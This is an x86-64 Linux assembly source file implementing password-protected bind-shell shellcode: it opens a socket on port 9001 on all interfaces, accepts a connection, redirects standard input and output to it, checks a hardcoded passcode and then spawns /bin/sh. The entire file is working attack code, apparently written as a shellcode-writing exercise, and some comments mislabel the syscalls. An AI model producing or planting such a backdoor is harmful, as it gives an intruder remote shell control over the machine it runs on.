

global _start


_start:

    jmp main
    ask_pass: db "Tell me the passcode", 0xa

main:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

    xor rsi, rsi
    mul rsi

	add rax, 41
    push byte 0x2
	pop rdi
	inc rsi
	;xor rdx, rdx 
	syscall

	; copy socket descriptor to rdi for future use 

	xchg rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

    push rax             ; pushing 0.0.0.0 into in_addr
    push word 0x2923 ;little endian -> 9001 = 0x2329
                        ; byte first ... 0x115C is 4444)
    push word 0x2      ; AF_INET - which is 0x02

    mov rsi, rsp        ; moving stack address to rsi

    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

    add rdx, 0x10         ;put 16 bytes  rdx - size of struct

    add rax, 0x31         ; set rax to sys_bind

    syscall             ; make the call to bind
                        ; socketid will be in rax

	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	xor rax, rax        ; zero out rax

                        ; socketid already in rsi
    mov rdx, rax        ; zeroing out rdx
    add rdx, 0x01       ; moving backlog number to rdx

    add rax, 50         ; setting rax to sys_listen

    syscall             ; make call to listen


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	xor rax, rax        ; zero out rax

                        ; socketid already in rsi
    mov rsi, rax        ; moving null to rsi
    mov rdx, rax        ; moving null to rdx

    add rax, 43         ; setting rax to sys_connect

    syscall             ; make call to listen

    ; duplicate sockets

   ; sys_dup2

    xchg rdi, rax       ; moves clientid to rdi

    ; rax : sys_dup2 33
    ; rdi : already contains clientid
    ; rsi : 1 to 3 in loop

    xor r9, r9          ; zeroing out loop counter

    loopin:
        xor rax, rax    ; zero out rax
        add rax, 33     ; setting rax to sys_dup2
        mov rsi, r9     ; move fileid to duplicate
        syscall         ; call dup2
        inc r9          ; increase r9 by 0x01
        cmp r9, 3       ; compare r9 to 0x03
        jne loopin

    ; ############ asking for password ------------------------------

    password:

    ; sys_write
    ; rax : 1 - write syscall number
    ; rdi : unsigned int fd : 1 for stdout
    ; rsi : const char *buf : password buffer
    ; rdx : size_t count : password size
    xor rax, rax
    xor rdx, rdx ; or cdq??
    inc rax
    mov rdi, rax
    lea rsi, [rel ask_pass]
    mov dl, 21
    syscall


    ; sys_read
    ; rdi : unsigned int fd : 0 for stdin
    ; rsi : char *buf : stack?
    ; rdx : size_t count : how big

    xor rdx, rdx
    xor rax, rax
    xor rdi, rdi


    ; rax is already zero
    mov rsi, rsp
    add rdx, 32 ;password size
    syscall

    mov rdi, rsp
    xor rsi, rsi
    push rsi
    mov rsi, 0x0a646f6f676f6e6f ; \ndoogono  --> \n - new line byte = 0x0a
    push rsi
    mov rsi, 0x7470756d61697461 ; tpumaita
    push rsi
    mov rsi, 0x6874726165777379 ; htraewsy
    push rsi
    mov rsi, 0x6c6e6d656c6f7369 ; lnmelosi
    push rsi
    mov rsi, rsp                ; password buffer pointer
    xor rcx, rcx
    add rcx, 32                 ; 31 bytes for password and 1 byte for newline char
    repe cmpsb
    jne password


    ; ###### ------------------------------------------

    ; execve

    ; First NULL push

    xor rax, rax
    push rax

    ; push /bin//sh in reverse

    mov rbx, 0x68732f2f6e69622f
    push rbx

    ; store /bin//sh address in RDI

    mov rdi, rsp

    ; Second NULL push
    push rax

    ; set RDX
    mov rdx, rsp


    ; Push address of /bin//sh
    push rdi

    ; set RSI

    mov rsi, rsp

    ; Call the Execve syscall
    add rax, 59
    syscall

